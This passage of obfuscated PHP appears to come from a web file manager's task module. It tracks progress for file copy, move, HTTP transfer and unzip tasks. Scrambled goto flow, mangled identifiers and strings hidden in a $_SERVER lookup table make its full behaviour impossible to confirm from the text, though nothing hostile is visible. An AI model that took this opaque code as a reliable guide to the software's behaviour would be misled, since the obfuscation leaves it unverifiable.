<?php
 goto e—©ÇÁ©¥; ağ‰Åª¯áò: class TaskFileTransfer extends Task { protected function startAfter() { goto CÍÛ­­•´; A¤ß›‹á¾: Hook::bind($d³‚‘«ªöŒ[1475], array($this, $d³‚‘«ªöŒ[1476])); Hook::bind($d³‚‘«ªöŒ[1477], array($this, $d³‚‘«ªöŒ[1478])); Hook::bind($d³‚‘«ªöŒ[1479], array($this, $d³‚‘«ªöŒ[1480])); goto fÌÎ˜„³ ˆ; e±âáŒ‰ŞÍ: $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[979]] = $d³‚‘«ªöŒ[33]; $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1485]] = $d³‚‘«ªöŒ[33]; $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1486]] = 0; goto d§§½›ÊÎ; f¡„—ÎÖ: Hook::bind($d³‚‘«ªöŒ[1472], array($this, $d³‚‘«ªöŒ[1473])); Hook::bind($d³‚‘«ªöŒ[532], array($this, $d³‚‘«ªöŒ[1474])); $this->sourceModelCopyFlag = !1; goto A¤ß›‹á¾; D§‘½‘èŸå: Hook::bind($d³‚‘«ªöŒ[543], array($this, $d³‚‘«ªöŒ[1470])); Hook::bind($d³‚‘«ªöŒ[509], array($this, $d³‚‘«ªöŒ[1471])); Hook::bind($d³‚‘«ªöŒ[506], array($this, $d³‚‘«ªöŒ[1471])); goto B•µæŸ±Ò¾; eî’ÑÖ¥âÀ: Hook::bind($d³‚‘«ªöŒ[1462], array($this, $d³‚‘«ªöŒ[1463])); Hook::bind($d³‚‘«ªöŒ[1464], array($this, $d³‚‘«ªöŒ[1465])); Hook::bind($d³‚‘«ªöŒ[1466], array($this, $d³‚‘«ªöŒ[1467])); goto fêÀÚ£ë‡å; fêÀÚ£ë‡å: Hook::bind($d³‚‘«ªöŒ[539], array($this, $d³‚‘«ªöŒ[1468])); Hook::bind($d³‚‘«ªöŒ[540], array($this, $d³‚‘«ªöŒ[1469])); Hook::bind($d³‚‘«ªöŒ[542], array($this, $d³‚‘«ªöŒ[1470])); goto D§‘½‘èŸå; d§§½›ÊÎ: $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1487]] = 0; $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1488]] = 0; if (!$E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1344]]) { $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1344]] = LNG($d³‚‘«ªöŒ[1489]); } goto F¹ÔĞÊÃº‚; CÍÛ­­•´: $d³‚‘«ªöŒ =& $_SERVER[‚Ğ°–—î]; $E‘ÑæÄÊ‰ =& $this->task; $this->sourceCopyFolder = !1; goto eî’ÑÖ¥âÀ; B•µæŸ±Ò¾: Hook::bind($d³‚‘«ªöŒ[511], array($this, $d³‚‘«ªöŒ[1471])); Hook::bind($d³‚‘«ªöŒ[513], array($this, $d³‚‘«ªöŒ[1471])); Hook::bind($d³‚‘«ªöŒ[515], array($this, $d³‚‘«ªöŒ[1471])); goto f¡„—ÎÖ; fÌÎ˜„³ ˆ: $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1481]] = LNG($d³‚‘«ªöŒ[1482]); $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1483]] = 0; $E‘ÑæÄÊ‰[$d³‚‘«ªöŒ[1484]] = 0; goto e±âáŒ‰ŞÍ; F¹ÔĞÊÃº‚: } protected function endAfter() { goto d ÇéÔ’È; C‹ã¶æøŸ†: Hook::unbind($F¬ŸïÉ±á¾[515], array($this, $F¬ŸïÉ±á¾[1471])); Hook::unbind($F¬ŸïÉ±á¾[1472], array($this, $F¬ŸïÉ±á¾[1473])); Hook::unbind($F¬ŸïÉ±á¾[532], array($this, $F¬ŸïÉ±á¾[1474])); goto A¬¨ÅÆ…Ã„; d©™ÜÕ‘: Hook::unbind($F¬ŸïÉ±á¾[1466], array($this, $F¬ŸïÉ±á¾[1467])); Hook::unbind($F¬ŸïÉ±á¾[539], array($this, $F¬ŸïÉ±á¾[1468])); Hook::unbind($F¬ŸïÉ±á¾[540], array($this, $F¬ŸïÉ±á¾[1469])); goto C·§‡Ì¾¿Ñ; C·§‡Ì¾¿Ñ: Hook::unbind($F¬ŸïÉ±á¾[542], array($this, $F¬ŸïÉ±á¾[1470])); Hook::unbind($F¬ŸïÉ±á¾[543], array($this, $F¬ŸïÉ±á¾[1470])); Hook::unbind($F¬ŸïÉ±á¾[509], array($this, $F¬ŸïÉ±á¾[1471])); goto C¦‚“±à÷; d ÇéÔ’È: $F¬ŸïÉ±á¾ =& $_SERVER[‚Ğ°–—î]; Hook::unbind($F¬ŸïÉ±á¾[1462], array($this, $F¬ŸïÉ±á¾[1463])); Hook::unbind($F¬ŸïÉ±á¾[1464], array($this, $F¬ŸïÉ±á¾[1465])); goto d©™ÜÕ‘; A¬¨ÅÆ…Ã„: Hook::unbind($F¬ŸïÉ±á¾[1475], array($this, $F¬ŸïÉ±á¾[1476])); Hook::unbind($F¬ŸïÉ±á¾[1477], array($this, $F¬ŸïÉ±á¾[1478])); Hook::unbind($F¬ŸïÉ±á¾[1479], array($this, $F¬ŸïÉ±á¾[1480])); goto B³Éê•˜ˆã; C¦‚“±à÷: Hook::unbind($F¬ŸïÉ±á¾[506], array($this, $F¬ŸïÉ±á¾[1471])); Hook::unbind($F¬ŸïÉ±á¾[511], array($this, $F¬ŸïÉ±á¾[1471])); Hook::unbind($F¬ŸïÉ±á¾[513], array($this, $F¬ŸïÉ±á¾[1471])); goto C‹ã¶æøŸ†; B³Éê•˜ˆã: } public function copyMoveStart($bñ×È¶Çİ•, $B‘µä­ Ë, $eƒì«…À©, $cİŞÖ…¼°‡) { goto CÆ×‹©”÷í; DŠÏ¢¶Éå: $A·„Ó¿Ì¥[$aæœŠÌ¡’•[1491]] = KodIO::transferType($bñ×È¶Çİ•, $eƒì«…À©); $this->update(); goto a«Ó«„æÚ; CÆ×‹©”÷í: $aæœŠÌ¡’• =& $_SERVER[‚Ğ°–—î]; self::log($aæœŠÌ¡’•[1490] . $B‘µä­ Ë . $aæœŠÌ¡’•[66] . $cİŞÖ…¼°‡); $E—¦Û±Ğáó = rtrim(TEMP_FILES, $aæœŠÌ¡’•[8]); goto b“…ôÉá; b“…ôÉá: if (substr($B‘µä­ Ë, 0, strlen($E—¦Û±Ğáó)) == $E—¦Û±Ğáó) { return; } if (substr($cİŞÖ…¼°‡, 0, strlen($E—¦Û±Ğáó)) == $E—¦Û±Ğáó) { return; } $A·„Ó¿Ì¥ =& $this->task; goto DŠÏ¢¶Éå; a«Ó«„æÚ: } public function updateAfter() { goto D©‚Ëº›Œ¿; fÜ‘ºÛéïÀ: $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1439]] = $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1488]] / $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[697]]; if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1439]] > 0) { $C¿‰ëØíÓ = timeFloat() - $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1441]] - $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1444]]; $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1445]] = $C¿‰ëØíÓ * (1 - $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1439]]) / $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1439]]; } goto DÃ½ÃÃ‚§ã; BÎÛ»¯äÅ‚: if ($this->sourceModelCopyFlag) { return; } if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1491]] == $C°Á’¡¦Ùœ[1095]) { return; } if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1491]] == $C°Á’¡¦Ùœ[1041] || $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1491]] == $C°Á’¡¦Ùœ[103]) { if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1485]]) { $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1488]] = $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1487]] + $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1484]]; } } else { if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1491]] == $C°Á’¡¦Ùœ[1096]) { if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1485]] == $C°Á’¡¦Ùœ[1041]) { $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1488]] = $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1487]] + $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1484]] * 0.5; } else { if ($f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1485]] == $C°Á’¡¦Ùœ[103]) { $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1488]] = $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1487]] + $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1483]] * 0.5 + $f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[1484]] * 0.5; } } } } goto fÜ‘ºÛéïÀ; D©‚Ëº›Œ¿: $C°Á’¡¦Ùœ =& $_SERVER[‚Ğ°–—î]; $f³·®‚ãÈÁ =& $this->task; if (!$f³·®‚ãÈÁ[$C°Á’¡¦Ùœ[697]]) { return; } goto BÎÛ»¯äÅ‚; DÃ½ÃÃ‚§ã: } public function addPath($eäÚ¦ò³÷) { goto e˜¹ëáÕç‹; Aù†¢”¡èš: $c†Ï”Ùƒ = IO::infoWithChildren($eäÚ¦ò³÷); $AÈ‹Ã¿«Á³ = $D•º…¿Ö¤‹[$A»¾Íè«¾°[1492]] ? $D•º…¿Ö¤‹[$A»¾Íè«¾°[1492]][$A»¾Íè«¾°[1493]] : 0; $D•º…¿Ö¤‹[$A»¾Íè«¾°[1492]] = array($A»¾Íè«¾°[1493] => $AÈ‹Ã¿«Á³ + 1, $A»¾Íè«¾°[386] => $c†Ï”Ùƒ[$A»¾Íè«¾°[28]], $A»¾Íè«¾°[75] => $c†Ï”Ùƒ[$A»¾Íè«¾°[75]], $A»¾Íè«¾°[466] => $c†Ï”Ùƒ[$A»¾Íè«¾°[466]] ? $c†Ï”Ùƒ[$A»¾Íè«¾°[466]] : $c†Ï”Ùƒ[$A»¾Íè«¾°[75]]); goto b÷Á·ËÁï—; e˜¹ëáÕç‹: $A»¾Íè«¾° =& $_SERVER[‚Ğ°–—î]; if (!$eäÚ¦ò³÷) { return; } $D•º…¿Ö¤‹ =& $this->task; goto Aù†¢”¡èš; b÷Á·ËÁï—: if ($c†Ï”Ùƒ[$A»¾Íè«¾°[29]] == $A»¾Íè«¾°[167]) { $D•º…¿Ö¤‹[$A»¾Íè«¾°[977]] += 1; } else { $D•º…¿Ö¤‹[$A»¾Íè«¾°[977]] += $c†Ï”Ùƒ[$A»¾Íè«¾°[80]][$A»¾Íè«¾°[78]]; if ($c†Ï”Ùƒ[$A»¾Íè«¾°[369]]) { $D•º…¿Ö¤‹[$A»¾Íè«¾°[977]] += $c†Ï”Ùƒ[$A»¾Íè«¾°[80]][$A»¾Íè«¾°[79]] + 1; } } $D•º…¿Ö¤‹[$A»¾Íè«¾°[697]] += $c†Ï”Ùƒ[$A»¾Íè«¾°[77]]; $this->update(); goto dŠîøºà‰; dŠîøºà‰: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($CëÇ‹õÂ) { $AšĞ’ì’Å° =& $_SERVER[‚Ğ°–—î]; $B ²å‡ŒÒ =& $this->task; $B ²å‡ŒÒ[$AšĞ’ì’Å°[1481]] = $CëÇ‹õÂ[$AšĞ’ì’Å°[28]]; $B ²å‡ŒÒ[$AšĞ’ì’Å°[979]] = $CëÇ‹õÂ[$AšĞ’ì’Å°[28]]; $this->update(); } public function copyFileStart($D£÷×Ó‘…Ã, $D“‚Ä¢’¢…, $fÅ‹¹åÎ«÷, $Eà·Ê¢š¨·, $bŒçÏ³—œò, $Dö×¨‹»Š) { goto d©ØØ¾¾÷á; d©ØØ¾¾÷á: $CîÕ¿Ô‚‘ =& $_SERVER[‚Ğ°–—î]; $DÔÉêÕÅï = $bŒçÏ³—œò; if ($DÔÉêÕÅï == $GLOBALS[$CîÕ¿Ô‚‘[1494]]) { $DÔÉêÕÅï = $GLOBALS[$CîÕ¿Ô‚‘[1495]]; } goto F¯‹¢¢’•³; F¯‹¢¢’•³: $GLOBALS[$CîÕ¿Ô‚‘[1495]] = $bŒçÏ³—œò; $GLOBALS[$CîÕ¿Ô‚‘[1494]] = $Dö×¨‹»Š; $cèØîÑ•ƒˆ =& $this->task; goto cŠ½ˆ¥¾ë; cŠ½ˆ¥¾ë: $cèØîÑ•ƒˆ[$CîÕ¿Ô‚‘[1481]] = $DÔÉêÕÅï; $cèØîÑ•ƒˆ[$CîÕ¿Ô‚‘[1483]] = (int) $D£÷×Ó‘…Ã->size($D“‚Ä¢’¢…); $cèØîÑ•ƒˆ[$CîÕ¿Ô‚‘[1484]] = 0; goto E…äÊ‚Àô¸; E…äÊ‚Àô¸: $cèØîÑ•ƒˆ[$CîÕ¿Ô‚‘[979]] = $CîÕ¿Ô‚‘[33]; $cèØîÑ•ƒˆ[$CîÕ¿Ô‚‘[1485]] = $CîÕ¿Ô‚‘[33]; $cèØîÑ•ƒˆ[$CîÕ¿Ô‚‘[1486]] = 0; goto A‚óè”ù–÷; A‚óè”ù–÷: $this->update(); goto B¦ñå¬Œè¿; B¦ñå¬Œè¿: } public function copyFileEnd($d‰­ÚèÃ†», $DèéÅ‰Ç™, $C„¬‘ˆá´ù, $D ©âÕ¸áÏ, $B˜“ÅÒˆÓˆ, $e“à‰è„éö) { $F©”Èƒˆë =& $_SERVER[‚Ğ°–—î]; $d„ˆªÉö˜± =& $this->task; $d„ˆªÉö˜±[$F©”Èƒˆë[1484]] = $d„ˆªÉö˜±[$F©”Èƒˆë[1483]]; $d„ˆªÉö˜±[$F©”Èƒˆë[1485]] = $F©”Èƒˆë[33]; if ($B˜“ÅÒˆÓˆ == $d„ˆªÉö˜±[$F©”Èƒˆë[1481]]) { $d„ˆªÉö˜±[$F©”Èƒˆë[1487]] += $d„ˆªÉö˜±[$F©”Èƒˆë[1483]]; $d„ˆªÉö˜±[$F©”Èƒˆë[1488]] = $d„ˆªÉö˜±[$F©”Èƒˆë[1487]]; $this->update(1); } else { $this->update(); $d„ˆªÉö˜±[$F©”Èƒˆë[1484]] = 0; } self::log($F©”Èƒˆë[1496] . $DèéÅ‰Ç™ . $F©”Èƒˆë[66] . $D ©âÕ¸áÏ . $F©”Èƒˆë[217] . $B˜“ÅÒˆÓˆ . $F©”Èƒˆë[1497] . $d„ˆªÉö˜±[$F©”Èƒˆë[1481]]); } public function updateFileEnd($aÔ±Î¹´ğ, $B‘å±İ‘·´) { goto e‘˜Ëó†¸½; e‘˜Ëó†¸½: $b³œ›Šò†ó =& $_SERVER[‚Ğ°–—î]; $CâÊëÂÌË° =& $this->task; $CâÊëÂÌË°[$b³œ›Šò†ó[1481]] = $aÔ±Î¹´ğ; goto ašĞÕáˆ; aî«¥×‹: $this->update(1); self::log($b³œ›Šò†ó[1498] . $aÔ±Î¹´ğ); goto aÍ¶ƒèÎ¼ö; ašĞÕáˆ: $CâÊëÂÌË°[$b³œ›Šò†ó[1483]] = $B‘å±İ‘·´; $CâÊëÂÌË°[$b³œ›Šò†ó[1487]] += $B‘å±İ‘·´; $CâÊëÂÌË°[$b³œ›Šò†ó[1488]] = $CâÊëÂÌË°[$b³œ›Šò†ó[1487]]; goto aî«¥×‹; aÍ¶ƒèÎ¼ö: } public function sourceModelCopy($cˆ’§àÜ—) { goto Fš†ì©ôØ¹; a±Š»¥ğŠ: switch ($dë‡²ÜËôô) { case $A„¥í…Ö–œ[507]: $b–Ó³Ë³ß = 1; break; case $A„¥í…Ö–œ[510]: $Eäè…¡Â¢æ[$A„¥í…Ö–œ[1481]] = $dÚ¦«ï–¦[$A„¥í…Ö–œ[28]]; break; case $A„¥í…Ö–œ[512]: $b–Ó³Ë³ß = intval($cˆ’§àÜ—[$A„¥í…Ö–œ[363]] * 0.4); break; case $A„¥í…Ö–œ[514]: $b–Ó³Ë³ß = intval($cˆ’§àÜ—[$A„¥í…Ö–œ[363]] * 0.2); break; case $A„¥í…Ö–œ[516]: $b–Ó³Ë³ß = intval($cˆ’§àÜ—[$A„¥í…Ö–œ[363]] * 0.4); break; } $this->update($b–Ó³Ë³ß); $this->sourceModelCopyFlag = !1; goto BÃ“Œ°Ÿˆ; Fš†ì©ôØ¹: $A„¥í…Ö–œ =& $_SERVER[‚Ğ°–—î]; $dë‡²ÜËôô = $cˆ’§àÜ—[0]; $dÚ¦«ï–¦ = $cˆ’§àÜ—[1]; goto e‰Ìï–‚§†; e‰Ìï–‚§†: $Eäè…¡Â¢æ =& $this->task; $this->sourceModelCopyFlag = !0; $b–Ó³Ë³ß = 0; goto a±Š»¥ğŠ; BÃ“Œ°Ÿˆ: } public function sourceRemove($Fõñ„™—¬, $B´˜½©‘¼­) { $EáòÆ·ÈÜ• =& $_SERVER[‚Ğ°–—î]; $this->sourceModelCopyFlag = !0; $AÖ©³‰í = 1; if (isset($Fõñ„™—¬[$EáòÆ·ÈÜ•[80]])) { $AÖ©³‰í = $Fõñ„™—¬[$EáòÆ·ÈÜ•[80]][$EáòÆ·ÈÜ•[78]] + $Fõñ„™—¬[$EáòÆ·ÈÜ•[80]][$EáòÆ·ÈÜ•[79]] + 1; } $this->update($AÖ©³‰í); $this->sourceModelCopyFlag = !1; } public function sourceMove($fé¼ÛÍÀ¯¹) { $this->sourceRemove($fé¼ÛÍÀ¯¹, !1); } public function curlProgress($A©’ã¤ æ†, $cËÜ‰êŠí—, $a’ùò‹‡¬Ï, $f—Œ³ãó°, $Bß™ ‹Ø”²) { $e‰­”à¼‡• =& $_SERVER[‚Ğ°–—î]; $aâ»–Âç®Ï =& $this->task; if ($Bß™ ‹Ø”² > 0) { $aâ»–Âç®Ï[$e‰­”à¼‡•[979]] = $e‰­”à¼‡•[1499]; $aâ»–Âç®Ï[$e‰­”à¼‡•[1485]] = $e‰­”à¼‡•[103]; if ($aâ»–Âç®Ï[$e‰­”à¼‡•[1483]] == $f—Œ³ãó° || $f—Œ³ãó° > 1024 * 1024) { $aâ»–Âç®Ï[$e‰­”à¼‡•[1484]] = $Bß™ ‹Ø”²; } if ($aâ»–Âç®Ï[$e‰­”à¼‡•[1486]]) { $aâ»–Âç®Ï[$e‰­”à¼‡•[1484]] = $Bß™ ‹Ø”² + $aâ»–Âç®Ï[$e‰­”à¼‡•[1486]]; } } else { if ($a’ùò‹‡¬Ï > 0) { if ($aâ»–Âç®Ï[$e‰­”à¼‡•[1483]] == $cËÜ‰êŠí—) { $aâ»–Âç®Ï[$e‰­”à¼‡•[1484]] = $a’ùò‹‡¬Ï; $aâ»–Âç®Ï[$e‰­”à¼‡•[979]] = $e‰­”à¼‡•[1500]; $aâ»–Âç®Ï[$e‰­”à¼‡•[1485]] = $e‰­”à¼‡•[1041]; } } } $this->update(); } public function curlProgressStart($D‰†Ñ²‡‡‘) { } public function curlProgressEnd($b‘å¹Ïã‡°) { $Cµ«‹í£È´ =& $_SERVER[‚Ğ°–—î]; $bÎ…øÇ¨Ì =& $this->task; $f³»©Åõ‘ = curl_getinfo($b‘å¹Ïã‡°); $a¥®íÍÕà = $f³»©Åõ‘[$Cµ«‹í£È´[1501]]; if ($bÎ…øÇ¨Ì[$Cµ«‹í£È´[1485]] == $Cµ«‹í£È´[103] && $a¥®íÍÕà) { $bÎ…øÇ¨Ì[$Cµ«‹í£È´[1486]] += $a¥®íÍÕà; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $FÔùà«Âß =& $_SERVER[‚Ğ°–—î]; $dƒ‹¨Óñƒ— =& $this->task; $dƒ‹¨Óñƒ—[$FÔùà«Âß[1502]] = 1; Hook::bind($FÔùà«Âß[1475], array($this, $FÔùà«Âß[1503])); Hook::bind($FÔùà«Âß[1477], array($this, $FÔùà«Âß[1504])); Hook::bind($FÔùà«Âß[1479], array($this, $FÔùà«Âß[1505])); } protected function endAfter() { $c„Ü¢„¥ŠË =& $_SERVER[‚Ğ°–—î]; Hook::unbind($c„Ü¢„¥ŠË[1475], array($this, $c„Ü¢„¥ŠË[1503])); Hook::unbind($c„Ü¢„¥ŠË[1477], array($this, $c„Ü¢„¥ŠË[1504])); Hook::unbind($c„Ü¢„¥ŠË[1479], array($this, $c„Ü¢„¥ŠË[1505])); } public function progressStart($F˜ñ‰¥Öé) { $E¯ßÎï¹¶Ë =& $_SERVER[‚Ğ°–—î]; $Bª½¯—”œÙ = curl_getinfo($F˜ñ‰¥Öé); self::log($E¯ßÎï¹¶Ë[1506] . $Bª½¯—”œÙ[$E¯ßÎï¹¶Ë[295]]); self::valueSet($this->task[$E¯ßÎï¹¶Ë[367]], $this->task); } public function progressEnd($a«£ÏÄÒ¯°) { $aìØî« =& $_SERVER[‚Ğ°–—î]; self::log($aìØî«[1507] . $this->task[$aìØî«[367]]); $this->end(); } public function progress($Dáê›ÙÒĞ, $C±ß½‰ìˆõ, $E¯„—Õ£æ‡, $c¢áèŠ£äÀ, $DçÆ·Ò±ÔÎ) { $a…¸ß‚±ê± =& $_SERVER[‚Ğ°–—î]; $E¬‚»£±¨Ÿ =& $this->task; if ($DçÆ·Ò±ÔÎ > 0) { $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[977]] = $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[977]] == 0 ? $c¢áèŠ£äÀ : $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[977]]; $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[991]] = $DçÆ·Ò±ÔÎ; } else { if ($E¯„—Õ£æ‡ > 0) { $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[977]] = $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[977]] == 0 ? $C±ß½‰ìˆõ : $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[977]]; $E¬‚»£±¨Ÿ[$a…¸ß‚±ê±[991]] = $E¯„—Õ£æ‡; } } $this->update(); self::log("\160\x72\x6f\147\162\x65\163\x73\110\164\x74\160\72\144\157\x77\x6e\72{$E¯„—Õ£æ‡}\x2f{$C±ß½‰ìˆõ}\x3b\40\165\160\x6c\x6f\141\x64\72{$DçÆ·Ò±ÔÎ}\x2f{$c¢áèŠ£äÀ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Bî¥¾ò˜¹‡; eÅàÕº—µ¨: if (!$EÆ£½ƒ ›[$cñæ–Ó•¶Ö[1344]]) { $EÆ£½ƒ ›[$cñæ–Ó•¶Ö[1344]] = LNG($cñæ–Ó•¶Ö[1512]); } goto BòÃÚ¤ì¾; CÜ‡ƒÖ‰: Hook::bind($cñæ–Ó•¶Ö[1036], array($this, $cñæ–Ó•¶Ö[1510])); $EÆ£½ƒ › =& $this->task; $EÆ£½ƒ ›[$cñæ–Ó•¶Ö[1511]] = $cñæ–Ó•¶Ö[1041]; goto eÅàÕº—µ¨; Bî¥¾ò˜¹‡: $cñæ–Ó•¶Ö =& $_SERVER[‚Ğ°–—î]; parent::startAfter(); Hook::bind($cñæ–Ó•¶Ö[1508], array($this, $cñæ–Ó•¶Ö[1509])); goto CÜ‡ƒÖ‰; BòÃÚ¤ì¾: } protected function endAfter() { $eĞŞßŞ”Ô =& $_SERVER[‚Ğ°–—î]; parent::endAfter(); Hook::unbind($eĞŞßŞ”Ô[1508], array($this, $eĞŞßŞ”Ô[1509])); Hook::unbind($eĞŞßŞ”Ô[1036], array($this, $eĞŞßŞ”Ô[1510])); } public function updateAfter() { $aôÛñõ«Å» =& $_SERVER[‚Ğ°–—î]; $fÊ£•œ‡ÛÃ =& $this->task; if (!$fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[977]] || !$fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[697]]) { return; } if ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1511]] == $aôÛñõ«Å»[1041]) { $aÏ ›À¬ˆá = 0; if ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1483]]) { $aÏ ›À¬ˆá = $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1484]] / $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1483]]; } $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1439]] = $aÏ ›À¬ˆá * 0.3; } else { if ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1511]] == $aôÛñõ«Å»[301]) { $aÏ ›À¬ˆá = $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[991]] / $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[977]]; $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1439]] = 0.3 + $aÏ ›À¬ˆá * 0.4; } else { if ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1511]] == $aôÛñõ«Å»[103]) { $dÒ–‹òì¬ = 0; if ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1485]] == $aôÛñõ«Å»[103]) { $dÒ–‹òì¬ = $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1484]]; } $aÏ ›À¬ˆá = ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1488]] + $dÒ–‹òì¬) / $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[697]]; $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1439]] = 0.3 + 0.4 + $aÏ ›À¬ˆá * 0.3; } } } if ($fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1439]] > 0) { $EÔôĞÆ¿™ = timeFloat() - $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1441]] - $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1444]]; $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1445]] = $EÔôĞÆ¿™ * (1 - $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1439]]) / $fÊ£•œ‡ÛÃ[$aôÛñõ«Å»[1439]]; } } public function addFile($d‰‘ù‘×ÕÙ) { goto föæô•‚; föæô•‚: $d¢Ÿó¯¾ò¶ =& $_SERVER[‚Ğ°–—î]; $A„­·ï¶è• =& $this->task; $e¤Îì‡„ = IO::info($d‰‘ù‘×ÕÙ); goto Dô¿Âø–ø; dÊ’¬‰ëÎ: $this->update(); goto C¸ÓÅ£Ä’; f§Ò·±£“ª: $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[977]] = 1; $DÚäØôÍ„ó = 0; $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[1492]] = array($d¢Ÿó¯¾ò¶[1493] => $DÚäØôÍ„ó + 1, $d¢Ÿó¯¾ò¶[386] => $e¤Îì‡„[$d¢Ÿó¯¾ò¶[28]], $d¢Ÿó¯¾ò¶[75] => $e¤Îì‡„[$d¢Ÿó¯¾ò¶[75]], $d¢Ÿó¯¾ò¶[466] => $e¤Îì‡„[$d¢Ÿó¯¾ò¶[466]] ? $e¤Îì‡„[$d¢Ÿó¯¾ò¶[466]] : $e¤Îì‡„[$d¢Ÿó¯¾ò¶[75]]); goto dÊ’¬‰ëÎ; Eàí…ÁŞµ: $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[979]] = $d¢Ÿó¯¾ò¶[1500]; $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[1485]] = $d¢Ÿó¯¾ò¶[1041]; $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[697]] = $e¤Îì‡„[$d¢Ÿó¯¾ò¶[77]]; goto f§Ò·±£“ª; Dô¿Âø–ø: $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[1481]] = $e¤Îì‡„[$d¢Ÿó¯¾ò¶[28]]; $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[1483]] = $e¤Îì‡„[$d¢Ÿó¯¾ò¶[77]]; $A„­·ï¶è•[$d¢Ÿó¯¾ò¶[1484]] = 0; goto Eàí…ÁŞµ; C¸ÓÅ£Ä’: } public function unzipAfter($F¡Í¬Ó×†œ) { goto CÜŠİ¯ÎÃÕ; dôôîŠÖ«: $CêÂ¥›™’™[$A÷œß…‚[991]] = 0; $CêÂ¥›™’™[$A÷œß…‚[1483]] = 0; $CêÂ¥›™’™[$A÷œß…‚[1484]] = 0; goto a¥¬¦æ†›ƒ; BÂ¹ìäğÒ‘: if ($Då–áù¤˜é[$A÷œß…‚[29]] == $A÷œß…‚[167]) { $CêÂ¥›™’™[$A÷œß…‚[977]] = 1; } else { $CêÂ¥›™’™[$A÷œß…‚[977]] = $Då–áù¤˜é[$A÷œß…‚[80]][$A÷œß…‚[78]]; } $CêÂ¥›™’™[$A÷œß…‚[979]] = $A÷œß…‚[33]; $CêÂ¥›™’™[$A÷œß…‚[1485]] = 0; goto dôôîŠÖ«; a¥¬¦æ†›ƒ: $CêÂ¥›™’™[$A÷œß…‚[1481]] = $A÷œß…‚[33]; $CêÂ¥›™’™[$A÷œß…‚[1488]] = 0; $CêÂ¥›™’™[$A÷œß…‚[697]] = $Då–áù¤˜é[$A÷œß…‚[77]]; goto A¦™ªäğ¨õ; c„¨í¢Ç: $Då–áù¤˜é = IO::infoWithChildren($F¡Í¬Ó×†œ); $Cö¢‚ç•Ï¼ = 0; $CêÂ¥›™’™[$A÷œß…‚[1492]] = array($A÷œß…‚[1493] => $Cö¢‚ç•Ï¼ + 1, $A÷œß…‚[386] => $Då–áù¤˜é[$A÷œß…‚[28]], $A÷œß…‚[75] => $Då–áù¤˜é[$A÷œß…‚[75]], 